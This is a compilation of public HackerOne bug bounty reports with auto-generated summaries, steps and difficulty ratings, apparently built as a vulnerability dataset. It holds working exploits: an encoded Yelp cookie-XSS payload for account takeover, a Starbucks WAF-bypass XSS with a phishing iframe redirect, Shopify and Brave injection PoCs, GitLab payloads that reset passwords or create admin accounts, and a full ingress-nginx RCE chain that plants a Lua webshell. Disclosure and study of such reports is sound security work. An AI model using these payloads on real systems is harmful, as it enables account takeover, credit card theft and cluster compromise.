1jcEhMQ0VhRGs1cmVZV0gwN0FiMVFrVXhoYUdiTlFZenQxNFZpUG0yeWJpSWdKVUtoeXV3Snp6QWpsbEp2dHJWMl9OclVablEwdkFfdjdQdUtPOUdRVmg3Mm5ZeDVzV242TGpNc3VXTGg1ZDI0VmstUnkxQ3FDX3hzMmpFZWgwM2Vtc1otMUdoYV8tQUJ3bGJDREg1eXFlZXBOa2gyRWFZWjdjS1ZzVVV4bklqcFhLck83eFM3elA3YUJ5dDBtSEExZ1VTZWktNGFhbF9QVks0eklHYTJHeXZMQ1RRM2Zxc2VEejdGQ3JRWU8tM0gtVks5TzJOaUJZWmN6YnpfdkxvUlF0QVNlUmdiajVqUVV0RURqZnpLOE1UVmd2V1BWajNFWnZ0NEJiZDBjcF9vRm1wTDFXak15QjltVHRPS0JTTTNEYVdkTE5nIjsKICAgIGIgPSByeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KTsKICAgIGZldGNoKCJodHRwczovL3d3dy55ZWxwLmRrL2dvb2dsZV9jb25uZWN0L3JlZ2lzdGVyIiwgeyJtZXRob2QiOiAiUE9TVCIsICJib2R5IjogbmV3IFVSTFNlYXJjaFBhcmFtcyh7ImlkX3Rva2VuIjogaWRfdG9rZW4sICJjc3JmdG9rIjogYlsxXX0pfSkKICB9KTsKICBhLm9wZW4oJ0dFVCcsICdodHRwczovL3d3dy55ZWxwLmRrL3Byb2ZpbGVfc2hhcmluZycpOwogIGEuc2VuZCgpOwp9KSgpOw
And the final link looks like this:
Code 2.07 KiB
1https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27YT1uZXcgWE1MSHR0cFJlcXVlc3QsYS5hZGRFdmVudExpc3RlbmVyKCJsb2FkIiwoZnVuY3Rpb24oKXtyeD0vIkdvb2dsZUNvbm5lY3QiOiAiKFteIl0qKS8saWRfdG9rZW49ImV5SmhiR2NpT2lKU1V6STFOaUlzSW10cFpDSTZJall3T0ROa1pEVTVPREUyTnpObU5qWXhabVJsT1dSaFpUWTBObUkyWmpBek9EQmhNREUwTldNaUxDSjBlWEFpT2lKS1YxUWlmUS5leUpwYzNNaU9pSm9kSFJ3Y3pvdkwyRmpZMjkxYm5SekxtZHZiMmRzWlM1amIyMGlMQ0p1WW1ZaU9qRTJPRFUzTVRBeE5qRXNJbUYxWkNJNklqWTVPVFk1TVRnNU5UY3hNUzEyYlRKck9HVm5Zak15TjJoeE0yd3dZVGRqY25OcU1HOHliemxzWlc0Mk1TNWhjSEJ6TG1kdmIyZHNaWFZ6WlhKamIyNTBaVzUwTG1OdmJTSXNJbk4xWWlJNklqRXdOREEwTVRBMU16a3lNalE1TkRZM01qRXhOeUlzSW1WdFlXbHNJam9pWkc5dlpHRmtkV2QxWTBCbmJXRnBiQzVqYjIwaUxDSmxiV0ZwYkY5MlpYSnBabWxsWkNJNmRISjFaU3dpWVhwd0lqb2lOams1TmpreE9EazFOekV4TFhadE1tczRaV2RpTXpJM2FIRXpiREJoTjJOeWMyb3diekp2T1d4bGJqWXhMbUZ3Y0hNdVoyOXZaMnhsZFhObGNtTnZiblJsYm5RdVkyOXRJaXdpYm1GdFpTSTZJa1JoWkdVZ1RYVnljR2g1SWl3aWNHbGpkSFZ5WlNJNkltaDBkSEJ6T2k4dmJHZ3pMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlM5aEwwRkJZMGhVZEdaR1ZsUkZTVTVmYzNWVlYwMUNUbXBqU0dGRVdIZzNUREpsYkhGUU1UVndOR2hMYWtzeFBYTTVOaTFqSWl3aVoybDJaVzVmYm1GdFpTSTZJa1JoWkdVaUxDSm1ZVzFwYkhsZmJtRnRaU0k2SWsxMWNuQm9lU0lzSW1saGRDSTZNVFk0TlRjeE1EUTJNU3dpWlhod0lqb3hOamcxTnpFME1EWXhMQ0pxZEdraU9pSm1Oell5WkRabFpqRXlabUZrTmpJNVltRTRZVFk1T0dGaE1ETmhNR00zTnpVNE16WXdZV1V4SW4wLkstWGNhQUJWaFV2LVdtY3BITENFYURrNXJlWVdIMDdBYjFRa1V4aGFHYk5RWXp0MTRWaVBtMnliaUlnSlVLaHl1d0p6ekFqbGxKdnRyVjJfTnJVWm5RMHZBX3Y3UHVLTzlHUVZoNzJuWXg1c1duNkxqTXN1V0xoNWQyNFZrLVJ5MUNxQ194czJqRWVoMDNlbXNaLTFHaGFfLUFCd2xiQ0RINXlxZWVwTmtoMkVhWVo3Y0tWc1VVeG5JanBYS3JPN3hTN3pQN2FCeXQwbUhBMWdVU2VpLTRhYWxfUFZLNHpJR2EyR3l2TENUUTNmcXNlRHo3RkNyUVlPLTNILVZLOU8yTmlCWVpjemJ6X3ZMb1JRdEFTZVJnYmo1alFVdEVEamZ6SzhNVFZndldQVmozRVp2dDRCYmQwY3Bfb0ZtcEwxV2pNeUI5bVR0T0tCU00zRGFXZExOZyIsYj1yeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KSxmZXRjaCgiaHR0cHM6Ly93d3cueWVscC5kay9nb29nbGVfY29ubmVjdC9yZWdpc3RlciIse21ldGhvZDoiUE9TVCIsYm9keTpuZXcgVVJMU2VhcmNoUGFyYW1zKHtpZF90b2tlbjppZF90b2tlbixjc3JmdG9rOmJbMV19KX0pfSkpLGEub3BlbigiR0VUIiwiaHR0cHM6Ly93d3cueWVscC5kay9wcm9maWxlX3NoYXJpbmciKSxhLnNlbmQoKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999
This video shows the attack. On the left is the victim and on the right is the attacker. The victim is logged into their yelp account. He then signs out and at some point visits our malicious link. When the victim sometime later signs into his Yelp account our payload triggers and our Google account ████ is linked to the victim. The attacker can now sign in with Google and gets signed into the victims account.
██████████
Impact
This attack can be used to completely compromise business accounts, and do account takeovers on normal accounts on yelp.com. Since the cookie does not expire, all it takes is for the victim to at some point vist our link, and they'll be compromised when they later go to sign in to yelp.com. The link can be spread via the Yelp forum, reviews or private messages to other uses, making it easy to target other Yelp users.



================================================================================
Vulnerability Description:
The vulnerability involves chaining a cookie-based XSS with a cookie parsing issue to achieve persistent XSS on yelp.com. This allows for attacks such as injecting a keylogger to steal credentials or linking an attacker's Google account to a victim's Yelp account for account takeover.

Steps to Reproduce:
1. Identify that yelp.com reflects the content of the 'guvo' cookie in the HTML without proper escaping, leading to XSS.
2. Discover that the 'yelpmainpaastacanary' cookie can be set via a URL query parameter '?canary=[value]' on any *.yelp.com request.
3. Exploit the backend's cookie parsing issue by setting a 'yelpmainpaastacanary' cookie with a smuggled 'guvo' cookie value containing malicious JavaScript.
4. Use the XSS to inject a keylogger on the login page or link an attacker's Google account to a victim's Yelp account.
Exploitation Difficulty:
This vulnerability requires understanding and chaining multiple components: cookie reflection, cookie parsing quirks, and XSS exploitation. The interaction between these components is non-obvious, and the attack involves manipulating complex application states to achieve persistence and impact.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/217790: XSS in $shop$.myshopify.com/admin/ via twine template injection in "Shopify.API.Modal.input" method when using a malicious app
================================================================================
RAW DESCRIPTION:

Description
The Shopify Embedded App SDK is used to facilitate limited interactions with parent page (/admin/apps/$id) from an embedded app within the shop admin interface. The SDK has multiple methods which allow an app to interact with the user which execute in the context of the admin domain and pass information back to the app. These UI elements are rendered from predefined templates using lodash's _.template method. While the method automatically provides input escaping the "input" template (used by the Shopify.API.Modal.input method) assigns a value to a special data-define attribute. While it's not possible to escape the attribute context, because the escaping is not fully context-aware it is possible to inject additional data into the attribute which is later interpreted by twine. Because twine does not execute in a sandbox this template becomes an eval primitive and it possible to obtain XSS in the context of the parent application.
Technical Details
When the Shopify.API.Modal.input method the following "input" template is rendered using lodash's _.template method:
Code 476 Bytes
1...
2<div class="ui-modal__body" data-define="{typedInput: &#39;[%= value %]&#39;}">
3...
4<label class="next-label" for="text-a10e7047a92878fc20031f40da0b5231"></label>
5<input type="text" id="text-a10e7047a92878fc20031f40da0b5231" data-bind="typedInput" autofocus="autofocus" class="next-input" />
6...
7<button class="btn close-modal [%= buttonClass %]" data-bind-event-click="closeModal({result: true, data: typedInput})" type="button" name="button">[%= okButton %]</button>
8...
The typedInput parameter is initialized from the value template parameter, bound to the text input, and finally used when the "okButton" is clicked. The data binding is handled by Shopify's twine JS library. Unfortunately because _.template is not fully context aware it will not provide JSON escaping for this parameter. For example if value is set to some'value the following invalid JSON will be created in the data-define attribute:
Code 26 Bytes
1{typedInput: 'some'value'}
Normally this would just break the intended functionality, however if we analyze twine we can discover that this type of injection can actually result in arbitrary JS execution. Twine evaluates parameters using the (wrapFunctionString)[https://github.com/Shopify/twine/blob/24c4ccfccf5b50937e6d9e433676651549be1497/dist/twine.js#L373] method:
Code 866 Bytes
1wrapFunctionString = function(code, args, node) {
2  var e, error, keypath;
3  if (isKeypath(code) && (keypath = keypathForKey(node, code))) {
4    if (keypath[0] === '$root') {
5      return function($context, $root) {
6        return getValue($root, keypath);
7      };
8    } else {
9      return function($context, $root) {
10        return getValue($context, keypath);
11      };
12    }
13  } else {
14    code = "return " + code;
15    if (nodeArrayIndexes(node)) {
16      code = "with($arrayPointers) { " + code + " }";
17    }
18    if (requiresRegistry(args)) {
19      code = "with($registry) { " + code + " }";
20    }
21    try {
22      return new Function(args, "with($context) { " + code + " }");
23    } catch (error) {
24      e = error;
25      throw "Twine error: Unable to create function on " + node.nodeName + " node with attributes " + (stringifyNodeAttributes(node));
26    }
27  }
28};
The method wraps the attribute value in a with block to provide named variables and passes it to a Function constructor which acts as a eval primitive. This means any injection will result in JavaScript execution. For example, if the following data is used for the value template parameter it will flow as follows:
Code 26 Bytes
1'-alert(document.domain)-'
This will result in a data-define attribute with the following value:
Code 34 Bytes
1{typedInput:''-document.domain-''}
This will result in the following code executing within twine:
Code 96 Bytes
1with($context) {
2  with($registry) {
3    return {typedInput: ''-alert(document.domain)-''}
4  }
5}
Putting this all together with the SDK we get the following script:
Code 188 Bytes
1window.parent.postMessage(JSON.stringify({
2  message: "Shopify.API.Modal.input",
3  data: {
4    message: {
5      message: "", 
6      value: "'-alert(document.domain)-'",
7    }
8  }
9}), "*");
Exploitability
You need to convince an administrator to authorize your malicious application, however the exploit does not require any specific permissions to trigger so an admin may be more willing to authorize the application.
Proof of Concept
I've created an example malicious application associated with my partner account shopify-whitehat-1@bored.engineer to demonstrate the issue...
Open the following URL on on $your-shop$.myshopify.com:
Code 176 Bytes
1/admin/oauth/authorize?client_id=5b7bd427b8caa69610bf85d1c87d4a04&scope=read_products&redirect_uri=https://attackerdoma.in/a4d76231-8657-48ed-8800-f1b02c7bb2ff.html&state=nonce
After authorizing the application an alert should appear on the /admin window containing document.domain.
Remediation
The "input" template should be updated to make the value parameter context-aware, perhaps wrapping in a JSON.stringify call.



================================================================================
Vulnerability Description:
This vulnerability is a Cross-Site Scripting (XSS) issue in the Shopify admin interface, triggered through a malicious app. The flaw arises from improper escaping in the Shopify.API.Modal.input method's template rendering, allowing JavaScript execution in the admin context via Twine's data binding.

Steps to Reproduce:
1. Create a malicious Shopify application and associate it with a partner account.
2. Convince an administrator to authorize the malicious application by directing them to the OAuth authorization URL.
3. Once authorized, the application triggers the XSS vulnerability via the Shopify.API.Modal.input method with a crafted payload.
4. The payload executes arbitrary JavaScript in the context of the Shopify admin domain, demonstrating the XSS vulnerability.
Exploitation Difficulty:
The vulnerability involves understanding multiple components: the Shopify Embedded App SDK, Lodash template rendering, Twine data binding, and the interaction between these systems. The attacker must recognize the non-obvious chain from template injection to JavaScript execution through Twine's context wrapping. Additionally, the exploit requires manipulating the application state through a malicious app installation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/227486: XSS on https://www.starbucks.co.uk (can lead to credit card theft) (/shop/paymentmethod)
================================================================================
RAW DESCRIPTION:

Hi,
Steps to reproduce:
Run Firefox (these steps require Firefox).
Log in on https://www.starbucks.co.uk/account/signin
Go to https://www.starbucks.co.uk/shop/card/egift and add any card to your basket.
Go to https://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton
After the page finishes loading click the "Checkout" title.
A confirmation prompt is shown showing the current domain.
Note that these steps can be automated due to missing CSRF protection on the "Add to Basket" option. Effectively, all a user has to do is to load a page which is under attacker's control. I set up an example: http://bayo.rocks/f42e32a3-9e9a-4be0-8cfb-4b5d766b97d0/sbux_poc.html (this link is private).
Description:
I'll explain what is going on and why this works. First, take a look at https://www.starbucks.co.uk/shop/card/egift?reflected
Looking at the source code you see the whole URL is reflected in a link tag.
Code 85 Bytes
1<link rel="canonical" href="https://www.starbucks.co.uk/shop/card/egift?reflected" />
Trying to inject malicious code seems to be blocked by a WAF. However, all checks can be eventually bypassed to inject arbitrary attributes, e.g. https://www.starbucks.co.uk/shop/card/egift?%u0022%20id=%u0022injected results in:
Code 90 Bytes
1<link rel="canonical" href="https://www.starbucks.co.uk/shop/card/egift?" id="injected" />
This works on every page (!) site-wide. However, I am not aware of any technique to get arbitrary JS execution at this point. However, there is a handy script loaded into the page that does the following:
Code 88 Bytes
1$("#checkout").bind("click", function(e) {
2    $("#checkoutButton").trigger("click")
3});
You see where this is going. In case I find a page that has an element with the id checkout, I can inject id="checkoutButton" onclick="malicous_js" to the above link element and the injected JS will be executed once the checkout element is clicked.
Exactly such a page is https://www.starbucks.co.uk/shop/paymentmethod (requires authentication). You can see the credit card form being loaded on this page. Luckily, it is loaded from a different origin so the form data can't be read using the injected JS. However, a determined attacker can easily set up a exact-looking page and change the iframe's content to steal the victim's credit card information:
Code 131 Bytes
1document.getElementById('payment-method-iframe').contentWindow.location.href = 'https://sbuxphishingsiteunderattackerscontrol.com';
Note that the checkout element is actually <body> so there is plenty of space where the user can click to execute the malicious JS.
Take into consideration that his could work in both IE and Chrome and the only thing preventing the PoC are the browsers' built in XSS protections. I am working on a bypass, but unfortunately I am not quite there, yet.
To sum up, I'll breakdown the injection from the PoC (==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton):
== -> used to trick the query string parsing code that is calling decodeURIcomponent(). Otherwise decodeURIcomponent("%u0022") throws an exception resulting in the "checkout bind" never being called.
%u0022 -> bypasses the WAF that is causing a 404 when the query contains "%22".
a%20onclick= -> allows to inject any on*= handlers. Otherwise a server error is returned when a blacklisted onhandler is followed by an equals sign in the query.
confirm(/-/g -> the WAF seems to dislike confirm(), alert() and so on. Adding a '/' after the left bracket makes him happy again.
+this.ownerDocument.domain) -> the WAF doesn't like "document".
Impact
As mentioned, an attacker can easily trick users into disclosing their credit data. The victims might not even realize that they were tricked and their privacy was compromised. All they know is they entered their data on "https://starbucks.co.uk" as usual. Note that other "typical" possible ways to compromise the victims using XSS (BeEF hooks etc.) are, of course, still applicable.
Recommendation
Correctly encode user input before rendering it back into the page. You shouldn't rely only on your WAF / custom blacklisting to protect you. Consider auditing yout site and adding CSRF protection to actions like "Add to Basket". You might also consider fixing the bypasses I mentioned.



================================================================================
Vulnerability Description:
This vulnerability is a reflected XSS on the Starbucks UK website that can lead to credit card theft. The attack involves injecting malicious attributes into a link element via URL parameters, which then triggers JavaScript execution when a user interacts with the checkout button. This can be exploited to redirect users to a phishing site mimicking the Starbucks payment page, potentially stealing credit card information.

Steps to Reproduce:
1. Log in on https://www.starbucks.co.uk/account/signin
2. Go to https://www.starbucks.co.uk/shop/card/egift and add any card to your basket.
3. Go to https://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton
4. After the page finishes loading click the 'Checkout' title.
5. A confirmation prompt is shown showing the current domain.
Exploitation Difficulty:
The attack involves multiple components including URL parameter manipulation, WAF bypass techniques, and leveraging existing JavaScript functionality to trigger the XSS. The attacker must understand the application's behavior, the WAF's filtering rules, and how to chain these elements together to achieve code execution. The subtle interaction between the injected attributes and the existing JavaScript event handlers adds to the complexity.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/993670: Universal XSS through FIDO U2F register from subframe
================================================================================
RAW DESCRIPTION:

Summary:
There are three weaknesses in Brave's FIDO U2F implementation.
u2f.register() can be executed from cross-origin subframe by invoking U2F.postMessage directly
Then, FIDO related modals show the name of top frame origin (but not caller subframe)
The version parameter sent from the above postMessage is embedded in an evaluateJavaScript without escape
The combination of these weaknesses allows cross-domain subframe to inject any JavaScript code to the top frame through fake U2F registration process.
## Products affected:
Brave iOS Version 1.20 (20.09.11.20), also current Nightly
Steps To Reproduce:
Open UXSS Victim hosted on alice.csrf.jp. This site has a cross-origin iframe that opens evil.csrf.jp.
Ready to Scan dialog is shown with the name of top frame
Insert your FIDO device such as YubiKey 5Ci and touch
Injected JavaScript alert() is executed on the top frame
Supporting Material/References:
See attached movie file for the demonstration
Impact
As written in summary, malicious web content in subframe can UXSS on the top frame origin.



================================================================================
Vulnerability Description:
The vulnerability involves three weaknesses in Brave's FIDO U2F implementation: the ability to execute u2f.register() from a cross-origin subframe via U2F.postMessage, the display of the top frame origin in FIDO modals instead of the caller subframe, and the embedding of the version parameter from postMessage into an evaluateJavaScript call without proper escaping. This combination allows a cross-domain subframe to inject arbitrary JavaScript code into the top frame through a fake U2F registration process.

Steps to Reproduce:
1. Open UXSS Victim hosted on alice.csrf.jp. This site has a cross-origin iframe that opens evil.csrf.jp.
2. Ready to Scan dialog is shown with the name of top frame
3. Insert your FIDO device such as YubiKey 5Ci and touch
4. Injected JavaScript alert() is executed on the top frame
Exploitation Difficulty:
The attack requires understanding and combining multiple components (cross-origin subframe execution, modal origin display, and JavaScript injection via unescaped parameters) and involves subtle interactions between these components. Additionally, the manipulation of the FIDO registration process to execute arbitrary JavaScript is not a commonly exploited path.

--------------------------------------------------------------------------------



Resource Injection Vulnerabilities (1 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1533976: Content injection in Jira issue title enabling sending arbitrary POST request as victim
================================================================================
RAW DESCRIPTION:

Summary
The issue described here leads to the same outcome as my previous report, https://hackerone.com/reports/1409788 . So look into that one for further details on the JavaScript gadgets. Also see my report https://hackerone.com/reports/1481207 for a detailed rundown of injections in GitLab.
This time it is the title field of Jira issue pages that renders without proper HTML encoding. Leading to HTML and CSS injection. By abusing a script gadget and a browser quirk (tested on Chrome and Firefox) the injection can be escalated into a highly dangerous arbitrary POST request. Depending on the payload, this POST request can lead to account takeover(of OAuth/SAML accounts) and also generation of admin accounts giving full access to the whole instance.
For the H1 triager it is OK to skip to the POC as the description will contain a lot of GitLab specifics.
Background
There is a premium feature in GitLab where a user can connect a project with a Jira tracker. See https://docs.gitlab.com/ee/integration/jira/ . When this is set up there will be a path in the project like so: https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues where any tasks created in Jira will be automatically fetched and presented to the members of the project.
Giving a task in Jira a title containing HTML will (if the Jira integration is set up in the project) generate an Jira issue in GitLab with the same title. When viewing the Jira issue details page (https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/ISO-1) this title field will be displayed without proper HTML encoding and thus render the supplied HTML. The caveat here is that this HTML will be sanitized by DOMPurify as it is added through the Vue v-safe-html attribute.
But as I have shown in my previous reports, there exists some JavaScript gadgets that slips through DOMPurify in your current default settings.
If you reed my other reports you can also see that there exists a gadget leading to full XSS, this do require the injected data to be present in the page on initial load. In this case, the data is fetched in a subsequent request and thus miss the first run through main.js
When a detail page for a Jira issue is first visited, the call for the issue data is actually too slow to hit the second tier of JavaScript gadgets (the code inside defered_execution in main.js). But I found a way to bypass this. When a browser leaves a page to visit another page, and then uses History.back (or the back button in the browser) the browser will not generate a complete rerun of the previous requests. It will instead use cached data, even for the data that is not supposed to be cached. So I found out that visiting a infected Jira issue page, browsing away from the page, and then clicking the back button to get to the Jira issue again, will speed up the data call to have it hit by the deferred part of main.js
To weaponize this, all we need is to first navigate away from the page to a server that just runs History.back() to directly redirect the user back to the malicious issue page and the payload will now trigger. All this can be made almost guarantied as the injection also allows for arbitrary CSS to be loaded. This makes it possible to craft a page that have an overlay link that will trigger on clicking anywhere.
The payload
I will present two payloads that will show the potential damage from this attack.
There exists a limitation as for the injection, as Jiras tasks have a 255 letter limit. This is not much to work with, but with some trix we can still get both account takeover and admin creation to work inside this payload.
First of we have a payload that will be able to perform account takeovers on accounts that do not have a password set. This is all OAuth registered accounts (and as far as I understand also SAML and maybe LDAP accounts). These accounts have an auto generated (strong! As of 14.9.2) password after the user signs up with, for example "sign in with GitHub". If the user does not actively go to /profile/password/edit and add a new password, the account is vulnerable to this attack. The password update page does not require "current password" before an initial password has been set. The payload looks like this
Code 254 Bytes
1<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
If we pull this apart, we have
Code 560 Bytes
1<a 
2  href=http:j15.se <--- a site that when visited just throws the user back, saving some chars by omiting slashes
3  class=js-feature-highlight <--- the classname to be used as a gadget
4  data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'
5  ^--- The payload where the POST request will get sent
6  >
7.</a> <--- close the anchor tag
8<style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
9  ^--- Unlimited styling to make the website a bulletproof click machine :)
This will generate a link covering the whole screen. When clicked (by clicking anywhere) the browser will go to http://j15.se which is a site that directly throws the user back to where it came from. This time, the browser will fetch the data from its cache and thus make the main.js hit the payload. The user will now have to click the page again to actually send the payload. It is two required clicks, but as we have full CSS control we can make it almost guarantied that a user will try to click somewhere on our page.
When the payload have fired, the OAuth user will have a new password. The user will be logged out but nothing else will point to the password having been set. Account takeover complete!
This payload will add a new administrator to the instance if an administrator visits the malicious page
Code 251 Bytes
1<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/api/v4/users?admin=true&email=j@j15.se&name=h&username=hack&password=12345678&skip_confirmation=true'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
Pulled apart
Code 257 Bytes
1<a href=http:j15.se
2  class=js-feature-highlight
3  data-dismiss-endpoint='/api/v4/users?admin=true&email=j@j15.se&name=h&username=hack&password=12345678&skip_confirmation=true'>
4.</a>
5<style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
Steps to reproduce
This requires three things:
access to a premium subscription (no problem on GitLab.com as there are free trials, they work great for the attack)
a Jira server. I used a cloud Jira instance on atlassian.com
a third party account that is not registered on GitLab. ex a GitHub user
POC:
Create a user attacker
Log in as attacker and create a group attack_group by visiting https://gitlab.com/groups/new (make sure the group have premium access)
Create a new project in the group called attack_proj
Go to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/edit
Follow the guide at https://docs.gitlab.com/ee/integration/jira/issues.html#view-jira-issues to enable viewing Jira issues in the project
Log in to Jira and create a task on the dashboard and name it <img src=#>
Go to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues and make sure the task is shown as an issue
Click the issue to open the Issue details page. The title will render as a broken image. This proves the injection.
<image_0>
Now go back to Jira and create a new task and name it
Code 254 Bytes
1<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
Go back to the issue list and refresh to make sure it is created
Now log in to GitLab.com with a third party provider, generating a new account on GitLab.com
(if the test project is not public invite the new user to the project as a Developer by visiting https://gitlab.com/atack_group/attack_proj/-/project_members)
Now visit the https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues list with the OAuth user and click the task with the payload
A page will show up looking empty, click anywhere on the page
The page will flicker, and now when you hover over the page it will show a big blue button stating "Got it!". Click it
<image_1>
Refresh the page, you should now be logged out from GitLab.com
Log in with the OAuth email and the password 12345678
Account takeover!
Important to note here is that the second click on the blue button can be made invisible as the first click. I did not want to spend my whole day in CSS but can get back with it if needed! :)
Impact
HTML and CSS injection in Jira issue page can make POST request as victim user. Can lead to account takeover or admin user escalation.
What is the current bug behavior?
The name/title field in the Jira issue page is not sanitized
What is the expected correct behavior?
The name should be shown sanitized
Output of checks
This bug happens on GitLab.com
Impact
Account takeover and admin user creation through arbitrary POST request in Jira issue



================================================================================
Vulnerability Description:
The vulnerability involves HTML and CSS injection in the Jira issue title field within GitLab, which is not properly sanitized. This allows an attacker to craft a payload that, when clicked by a victim, sends arbitrary POST requests. The attack leverages JavaScript gadgets, browser caching quirks, and CSS manipulation to ensure the payload executes, leading to account takeover or admin user creation.

Steps to Reproduce:
1. Create a Jira issue with a malicious HTML title containing a crafted payload that exploits the JavaScript gadget and browser caching behavior.
2. Set up a GitLab project with Jira integration and have a victim user (with OAuth/SAML account) visit the malicious Jira issue page, click anywhere, and then click the 'Got it!' button to trigger the account takeover.
Exploitation Difficulty:
This vulnerability requires understanding multiple complex components: HTML/CSS injection, JavaScript gadget exploitation, browser caching behavior, and GitLab's Jira integration. The attacker must also craft a payload within Jira's 255-character limit and ensure it triggers correctly through user interaction. The interaction between these components is subtle and non-obvious, requiring deep knowledge of both GitLab and browser behaviors.

--------------------------------------------------------------------------------



Code Injection Vulnerabilities (9 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1620702: RCE  on ingress-nginx-controller via Ingress spec.rules.http.paths.path field
================================================================================
RAW DESCRIPTION:

Report Submission Form
Summary:
A user with ingress create/update privilege may inject config into nginx.conf with path.
Config the log_format and access_log to write arbitrary file.
Include the file we created to bypass path sanitizer to RCE.
Kubernetes Version:
Code 236 Bytes
1serverVersion:
2  buildDate: "2022-03-06T21:32:53Z"
3  compiler: gc
4  gitCommit: e6c093d87ea4cbb530a7b2ae91e54c0842d8308a
5  gitTreeState: clean
6  gitVersion: v1.23.4
7  goVersion: go1.17.7
8  major: "1"
9  minor: "23"
10  platform: linux/amd64
Component Version:
Code 359 Bytes
1-------------------------------------------------------------------------------
2NGINX Ingress controller
3  Release:       v1.2.1
4  Build:         08848d69e0c83992c89da18e70ea708752f21d7a
5  Repository:    https://github.com/kubernetes/ingress-nginx
6  nginx version: nginx/1.19.10
7
8-------------------------------------------------------------------------------
Steps To Reproduce:
Create a kind cluster config
lab.yaml
Code 467 Bytes
1kind: Cluster
2name: lab
3apiVersion: kind.x-k8s.io/v1alpha4
4nodes:
5# the control plane node config
6- role: control-plane
7  kubeadmConfigPatches:
8  - |
9    kind: InitConfiguration
10    nodeRegistration:
11      kubeletExtraArgs:
12        node-labels: "ingress-ready=true"
13  extraPortMappings:
14  - containerPort: 80
15    hostPort: 80
16    protocol: TCP
17  - containerPort: 443
18    hostPort: 443
19    protocol: TCP
20# the three workers
21- role: worker
22- role: worker
23- role: worker
Create a testing cluster with the previous config
Code 37 Bytes
1kind create cluster --config lab.yaml
Install nginx-ingress-controller
Code 120 Bytes
1kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml
Create a the first malicious ingress
This ingress will allow attacker to write arbitrary content to arbitrary file.
(note that the service not-exist-service does not need to exist)
write_ingress.yaml
Code 666 Bytes
1apiVersion: networking.k8s.io/v1
2kind: Ingress
3metadata:
4  name: webexp
5spec:
6  rules:
7    - host: "example.com"
8      http:
9        paths:
10          - path: "/x/ {\n
11            }\n
12          }\n
13          log_format exploit escape=none $http_x_ginoah;\n
14          server {\n
15            server_name x.x;\n
16            listen 80;\n
17            listen [::]:80;\n
18            location /z/ {\n
19                access_log /tmp/luashell exploit;\n
20            }\n
21            location /x/ {\n
22          #"
23            pathType: Exact
24            backend:
25              service:
26                name: not-exist-service
27                port:
28                  number: 8080
Apply the first malicious ingress config
Code 35 Bytes
1kubectl apply -f write_ingress.yaml
Write a malicious lua config to /tmp/luashell
Note that in other cluster config, the localhost may need to change to ingress-controller's ip.
Code 263 Bytes
1curl localhost/z/ -H "host: x.x" -H 'x-ginoah: content_by_lua_block {ngx.req.read_body();local post_args = ngx.req.get_post_args();local cmd = post_args["cmd"];if cmd then f_ret = io.popen(cmd);local ret = f_ret:read("*a");ngx.say(string.format("%s", ret));end;}'
Create a the second malicious ingress
This ingress will include the malicious lua config, which allow attack to execute arbitrary command.
webshell_ingress.yaml
Code 655 Bytes
1apiVersion: networking.k8s.io/v1
2kind: Ingress
3metadata:
4  name: webexp
5spec:
6  rules:
7    - host: "example.com"
8      http:
9        paths:
10          - path: "/x/ {\n
11            }\n
12          }\n
13          log_format exploit escape=none $http_x_ginoah;\n
14          server {\n
15            server_name x.x;\n
16            listen 80;\n
17            listen [::]:80;\n
18            location /z/ {\n
19                include /tmp/luashell;\n
20            }\n
21            location /x/ {\n
22          #"
23            pathType: Exact
24            backend:
25              service:
26                name: not-exist-service
27                port:
28                  number: 8080
Apply the second malicious ingress config
Code 38 Bytes
1kubectl apply -f webshell_ingress.yaml
RCE and get output
Code 44 Bytes
1curl localhost/z/ -H "host: x.x" -d "cmd=id"
Supporting Material/References:
[attachment / reference]
<image_0>
Impact
A cluster user/SA with ingress create/update privilege may Remote Code Execution on ingress-nginx-controller pod
After RCE on ingress-nginx-controller the attacker may
utilize the token to take further action on cluster with ingress's privilege
eavesdrop the traffic, modify other ingress rule
DOS
...



================================================================================
Vulnerability Description:
A user with ingress create/update privileges can inject malicious configurations into nginx.conf via the Ingress spec.rules.http.paths.path field. This allows writing arbitrary files and including them to bypass path sanitization, leading to Remote Code Execution (RCE) on the ingress-nginx-controller pod.

Steps to Reproduce:
1. Create a kind cluster configuration and set up a testing environment with nginx-ingress-controller installed.
2. Apply two malicious ingress configurations sequentially to exploit the vulnerability, first to write arbitrary content to a file, then to include this file for RCE.
